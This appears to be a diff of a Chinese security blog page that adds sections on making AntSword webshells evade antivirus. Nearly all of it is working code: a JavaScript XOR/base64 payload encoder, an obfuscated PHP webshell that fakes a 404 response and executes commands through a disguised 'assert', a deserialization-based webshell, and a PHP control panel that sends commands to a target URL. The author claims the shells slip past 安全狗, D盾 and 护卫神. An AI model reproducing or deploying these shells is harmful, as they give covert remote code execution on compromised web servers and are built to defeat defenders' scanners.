@@ -1011,6 +1011,157 @@ $lnng = $post;
 $lnng2 = $lnng1;
 @$comi-&gt;c = substr($lnng2, 0);
 ?&gt;</code></pre><p>webshell是能够免杀安全🐕和D盾和护卫神的，其他的没测试<br><img src="/images/pasted-227.png" alt="upload successful"><br><img src="/images/pasted-226.png" alt="upload successful"></p>
+<h2 id="xor-random-base64免杀"><a href="#xor-random-base64免杀" class="headerlink" title="xor_random_base64免杀"></a>xor_random_base64免杀</h2><p>编码器:</p>
+<pre><code>/**
+ * php::base64编码器
+ * Create at: 2020/11/19 21:20:31
+ *lnng.top
+ */
+
+&#39;use strict&#39;;
+
+
+module.exports = (pwd, data, ext = {}) =&gt; {
+  let randomID = `x${Math.random().toString(16).substr(2)}`;
+
+  function xor(payload) {
+    let crypto = require(&#39;crypto&#39;);
+    let key = crypto.createHash(&#39;md5&#39;).update(randomID).digest(&#39;hex&#39;).substr(6);
+    ext.opts.httpConf.headers[&#39;Cookie&#39;] = &#39;PHPSESSID=&#39; + key;
+    key = key.split(&quot;&quot;).map(t =&gt; t.charCodeAt(0));
+    //let payload=&quot;phpinfo();&quot;;
+    let cipher = payload.split(&quot;&quot;).map(t =&gt; t.charCodeAt(0));
+    for (let i = 0; i &lt; cipher.length; i++) {
+      cipher[i] = cipher[i] ^ key[i % 26]
+    }
+    cipher = cipher.map(t =&gt; String.fromCharCode(t)).join(&quot;&quot;)
+    cipher = Buffer.from(cipher).toString(&#39;base64&#39;);
+    //console.log(cipher)
+    return cipher;
+  }
+
+  data[&#39;_&#39;] = Buffer.from(data[&#39;_&#39;]).toString(&#39;base64&#39;);
+
+  // 生成一个随机变量名
+  let num =  Math.floor(Math.random()*15);
+  let randomStr = `${Math.random().toString(16).substr(num)}`;
+  //data[&#39;password&#39;] = 15-num;
+
+  //data[pwd] = `eval(base64_decode(&quot;${data[&#39;_&#39;]}&quot;));`;
+  //data[pwd]=xor(data[pwd]);
+  //data[pwd] = `${randomStr}` + data[pwd] + `${randomStr}`;
+
+  let ret = {};
+  for (let _ in data) {
+    if (_ === &#39;_&#39;) { continue };
+    //if (_ === &#39;num&#39;) { continue };
+    //if (_ === &#39;password&#39;) { continue };
+    ret[_] = Buffer.from(data[_]).toString(&#39;hex&#39;);
+    //ret[_] = Buffer.from(data[_]);
+  }
+  //ret[password] = data[&#39;password&#39;].toString(&#39;hex&#39;);
+  ret[&#39;password&#39;] = 15-num;
+  ret[pwd] = `eval(base64_decode(&quot;${data[&#39;_&#39;]}&quot;));`;
+  ret[pwd] = xor(ret[pwd]);
+  ret[pwd] = `${randomStr}` + ret[pwd] + `${randomStr}`
+  //ret[pwd] = ret[pwd].toString(&#39;hex&#39;);
+  return ret;
+  //删除原有payload
+  //delete data[&#39;_&#39;];
+ //返回编码器处理后的payload数组
+  //return data;
+}</code></pre><p>免杀的webshell(密码username)</p>
+<pre><code>&lt;?php
+header(&#39;HTTP/1.1 404&#39;);
+class Cookie{
+    function __construct(){
+        $password = &amp;$password1;
+        $password1 = $_REQUEST[&#39;password&#39;];
+        $num = &amp;$password;
+        $num = $_REQUEST[&#39;password&#39;];
+        if(is_numeric($num)){
+        $post=base64_decode(substr(@$_REQUEST[&#39;username&#39;],$num,-$num));
+        }
+        return $post;
+    }
+    function decode(){
+        $key=$_COOKIE[&#39;PHPSESSID&#39;];
+        $post = $this-&gt;__construct();
+        for($i=0;$i&lt;strlen($post);$i++){
+            $k = $i%26;
+            $s = $post[$i];
+            $post[$i] = $s ^ $key[$k];  
+        }
+        return $post;
+    }
+    function __destruct(){
+        foreach($_POST as $k =&gt; $v){
+            if ($k!=&#39;password&#39;&amp;&amp;$k!=&#39;username&#39;) {
+                $b = &amp;$a;
+                $a = $v;
+                $c = &amp;$b;
+                $_POST[$k]=hex2bin($c);
+            }
+        }
+        $a = (&#39;!&#39;^&#39;@&#39;).&#39;s&#39;.&#39;s&#39;.&#39;e&#39;.&#39;r&#39;.&#39;t&#39;;
+        $lnng1 = &amp;$lnng;
+        $lnng = $this-&gt;decode();
+        $lnng2 = $lnng1;
+        return @$a(`/**123**/`.$lnng2.`/**123**/`);
+    }
+}
+$check=new Cookie();
+?&gt;</code></pre><p><img src="/images/pasted-431.png" alt="upload successful"></p>
+<h2 id="反序列化免杀-这里和蚁剑没关系"><a href="#反序列化免杀-这里和蚁剑没关系" class="headerlink" title="反序列化免杀(这里和蚁剑没关系)"></a>反序列化免杀(这里和蚁剑没关系)</h2><p>写的非常简单，自己只是测试着玩，可以写的更加完善，主要是思路<br>接近有漏洞的代码就可以免杀(个人理解,请大佬指教)<br>客户端webshell</p>
+<pre><code>&lt;?php
+class Lnng{
+    var $lnng;
+    function __destruct(){
+        $a = (&#39;!&#39;^&#39;@&#39;).&#39;s&#39;.&#39;s&#39;.&#39;e&#39;.&#39;r&#39;.&#39;t&#39;;
+        @$a($this-&gt;lnng);
+    }
+
+}
+$lnng = unserialize($_POST[&#39;lnng&#39;]);
+?&gt;</code></pre><p>服务端自己写了一个php页面非常的简陋，菜哭了我</p>
+<pre><code>&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;head&gt;
+    &lt;title&gt;php序列化webshell&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;form method=&quot;post&quot; action=&quot;&quot;&gt;
+    &lt;p&gt;请输出url,例如http://192.168.124.141/12.php&lt;/p&gt;
+     &lt;input type=&quot;text&quot; name=&quot;ip&quot; style=&quot;width:400px; height:30px;&quot; value=&quot;&lt;?php if(isset($_POST[&#39;ip&#39;])){echo $_POST[&#39;ip&#39;];}?&gt;&quot; /&gt;
+     &lt;br&gt;
+     &lt;p&gt;请输出命令,内部命令执行方式assert(你输入的值)&lt;/p&gt;
+     &lt;input type=&quot;text&quot; name=&quot;command&quot; style=&quot;width:400px; height:30px;&quot; value=&quot;&lt;?php if(isset($_POST[&#39;command&#39;])){echo $_POST[&#39;command&#39;];}?&gt;&quot;/&gt;
+      &lt;input type=&quot;submit&quot; value=&quot;提交&quot; /&gt;
+    &lt;/form&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+&lt;?php
+//header(&quot;Content-Type:text/html;charset=gb2312&quot;);
+class Lnng{
+    var $lnng;
+    function __destruct(){
+        $a = (&#39;!&#39;^&#39;@&#39;).&#39;s&#39;.&#39;s&#39;.&#39;e&#39;.&#39;r&#39;.&#39;t&#39;;
+        //@$a($this-&gt;lnng);
+    }
+}
+$lnng = new Lnng();
+@$lnng-&gt;lnng = $_POST[&#39;command&#39;];
+//echo $_POST[&#39;command&#39;];
+$lnng = serialize($lnng);
+@$ip = $_POST[&#39;ip&#39;];
+//echo $ip;
+$data = array(&#39;lnng&#39;=&gt;$lnng);
+$requestBody = http_build_query($data);
+$context = stream_context_create([&#39;http&#39; =&gt; [&#39;method&#39; =&gt; &#39;POST&#39;, &#39;header&#39; =&gt; &quot;Content-Type: application/x-www-form-urlencoded\r\n&quot;.&quot;Content-Length: &quot; . mb_strlen($requestBody), &#39;content&#39; =&gt; $requestBody]]);
+@$response = file_get_contents($ip, false, $context);
+echo iconv(&quot;GB2312&quot;,&quot;UTF-8&quot;,$response);
+//echo $response;
+?&gt;</code></pre><p><img src="/images/pasted-432.png" alt="upload successful"><br><img src="/images/pasted-433.png" alt="upload successful"></p>
 <h2 id="解码器原理"><a href="#解码器原理" class="headerlink" title="解码器原理"></a>解码器原理</h2><pre><code>/**
  * php::base64解码器
  * Create at: 2020/11/21 17:15:24
